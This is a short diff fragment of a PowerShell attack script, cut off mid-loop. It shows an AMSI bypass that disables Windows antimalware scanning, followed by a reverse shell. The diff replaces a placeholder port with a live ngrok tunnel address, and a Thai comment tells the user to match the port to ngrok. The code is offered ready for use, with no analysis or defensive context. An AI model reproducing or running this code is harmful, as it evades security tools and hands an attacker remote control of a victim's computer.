@@ -4,7 +4,7 @@ $field = $amsi.GetField('amsiInitFailed','NonPublic,Static')
 $field.SetValue($null,$true)
 
 # Reverse Shell (เปลี่ยน port ให้ตรง ngrok)
-$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io', YOUR_PORT)
+$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io', 14636)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
